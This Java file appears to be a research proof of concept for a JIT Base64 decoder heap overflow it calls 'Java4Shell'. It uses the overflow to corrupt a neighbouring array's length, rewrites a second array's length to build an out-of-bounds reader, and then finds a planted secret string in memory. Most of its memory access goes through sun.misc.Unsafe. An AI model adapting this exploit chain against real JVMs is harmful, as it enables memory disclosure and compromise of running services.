import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Definitive measurement of the Java4Shell writer/reader chain.
 *
 * Ground rules (learned the hard way):
 *   - every length is read through Unsafe; C2 constant-folds `arr.length`
 *     for an array it can see, which silently hides the corruption
 *   - every array lives in a byte[][] so no length is constant-foldable
 *   - offsets are discovered by scanning, never assumed
 *   - each phase prints the measured number; nothing is asserted
 */
public final class Chain3 {
    private static volatile int sink;
    private static sun.misc.Unsafe u;
    private static long abase;

    static int len(byte[] b) { return u.getInt(b, 12); }
    static long addr(byte[] b) {
        Object[] a = new Object[] { b };
        return u.getLong(a, u.arrayBaseOffset(Object[].class));
    }
    static int le32(byte[] b, long off) {
        return (u.getByte(b, off) & 0xff) | ((u.getByte(b, off + 1) & 0xff) << 8)
                | ((u.getByte(b, off + 2) & 0xff) << 16) | ((u.getByte(b, off + 3) & 0xff) << 24);
    }
    static void putLe32(byte[] b, long off, int v) {
        u.putByte(b, off, (byte) v);
        u.putByte(b, off + 1, (byte) (v >>> 8));
        u.putByte(b, off + 2, (byte) (v >>> 16));
        u.putByte(b, off + 3, (byte) (v >>> 24));
    }

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);
        abase = u.arrayBaseOffset(byte[].class);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);

        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);
        Arrays.fill(warm, (byte) 0x5a);
        try { d.decode(bad, warm); } catch (IllegalArgumentException e) { }
        int ovf = 0;
        for (int i = 50; i < 112; i++) if (warm[i] != (byte) 0x5a) ovf++;
        System.out.println("[warm] overflowBytes=" + ovf);
        if (ovf != 62) { System.out.println("RESULT=NOT_VULNERABLE"); return; }

        // header template captured from a pristine array
        byte[] tmpl = new byte[64];
        final long goodMark = u.getLong(tmpl, 0);
        final int goodKlass = u.getInt(tmpl, 8);
        System.out.printf("[tmpl] mark=0x%016x klass=0x%08x%n", goodMark, goodKlass);

        final int N = 16;
        byte[][] dst = new byte[N][], wri = new byte[N][], rdr = new byte[N][], sec = new byte[N][];
        String needle = "J4S-SECRET-7-DO-NOT-LEAK";
        for (int i = 0; i < N; i++) {
            dst[i] = new byte[65];
            wri[i] = new byte[64];
            rdr[i] = new byte[64];
            Arrays.fill(rdr[i], (byte) 0xBB);
            sec[i] = new byte[96];
            byte[] s = ("J4S-SECRET-" + i + "-DO-NOT-LEAK").getBytes(StandardCharsets.US_ASCII);
            System.arraycopy(s, 0, sec[i], 0, s.length);
            for (int j = s.length; j < sec[i].length; j++) sec[i][j] = (byte) 0xC3;
        }

        int hit = -1;
        for (int i = 0; i < N; i++) {
            try { d.decode(bad, dst[i]); } catch (IllegalArgumentException e) { }
            if (len(wri[i]) != 64 && hit < 0) hit = i;
            System.out.printf("[1] pair%2d writerLen=0x%08x java=%d%n",
                    i, len(wri[i]), wri[i].length);
        }
        if (hit < 0) { System.out.println("RESULT=NO_CORRUPTION"); return; }

        byte[] w = wri[hit], r = rdr[hit], s = sec[hit];
        long wa = addr(w), ra = addr(r), sa = addr(s);
        System.out.printf("[2] hit=%d writerLen=%d (0x%08x) mark=0x%016x klass=0x%08x%n",
                hit, len(w), len(w), u.getLong(w, 0), u.getInt(w, 8));
        System.out.printf("[3] writer=0x%x reader=+%d secret=+%d%n", wa, ra - wa, sa - wa);

        String pre;
        try { w[0] = (byte) 1; pre = "ok"; } catch (Throwable t) { pre = t.getClass().getSimpleName(); }
        System.out.println("[4] plain store BEFORE repair = " + pre);

        u.putLong(w, 0, goodMark);
        u.putInt(w, 8, goodKlass);
        System.out.printf("[5] repaired mark=0x%016x klass=0x%08x len=%d%n",
                u.getLong(w, 0), u.getInt(w, 8), len(w));

        boolean post;
        try { w[0] = (byte) 0x22; w[500] = (byte) 0x33; post = (w[0] == 0x22 && w[500] == 0x33); }
        catch (Throwable t) { post = false; System.out.println("    store failed: " + t); }
        System.out.println("[6] plain store AFTER repair = " + post + " len=" + len(w));

        // locate the reader length field inside the writer's reach
        int rLenField = -1;
        for (int off = 16; off < 512; off++) {
            if (le32(w, abase + off) == 64) {
                long cand = wa + off - 12;
                if (cand == ra) { rLenField = off; break; }
            }
        }
        System.out.println("[7] reader length field at writer[" + rLenField
                + "] (expected " + (ra - wa + 12) + ")");
        if (rLenField < 0) { System.out.println("RESULT=NO_READER_FIELD"); return; }

        int newLen = 4096;
        putLe32(w, abase + rLenField, newLen);
        System.out.println("[8] reader.length now = " + len(r)
                + " (java=" + r.length + ") writerLen=" + len(w));
        if (len(r) != newLen) { System.out.println("RESULT=WRITER_FAILED"); return; }

        // disclosure: find the planted secret through the extended reader
        StringBuilder win = new StringBuilder();
        int found = -1;
        for (int p = 64; p < 2048; p++) {
            byte b = u.getByte(r, abase + p);
            win.append(b >= 0x20 && b < 0x7f ? (char) b : '.');
            if (win.length() > needle.length() + 4) win.deleteCharAt(0);
            if (win.lastIndexOf(needle) >= 0) { found = p; break; }
        }
        System.out.println("[9] disclosure needle=\"" + needle + "\" found=" + (found >= 0)
                + (found >= 0 ? " at reader+" + found : ""));
        StringBuilder hex = new StringBuilder();
        for (int p = 40; p < 72; p++) hex.append(u.getByte(r, abase + p) == 0 ? "00 " :
                String.format("%02x ", u.getByte(r, abase + p) & 0xff));
        System.out.println("[10] reader[40..71] = " + hex);
        System.out.println("RESULT=" + (post && found >= 0 ? "CHAIN_WRITER_READER_DISCLOSURE" : "PARTIAL"));
    }
}
